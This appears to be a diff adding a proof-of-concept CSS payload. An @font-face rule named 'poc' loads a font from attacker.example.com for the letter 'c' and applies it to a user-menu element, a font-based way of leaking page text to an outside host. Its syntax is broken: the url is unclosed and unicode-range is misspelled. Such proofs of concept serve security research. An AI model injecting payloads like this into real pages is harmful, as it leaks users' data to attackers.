@@ -1,0 +1,9 @@
+@font-face{
+  font-family:poc;
+  src: url(https://attacker.example.com/?c;
+  unicode0range:U_0063;
+}
+
+[data-test-subj="userMenu"] .euiText--medium p {
+  font-family: poc;
+}
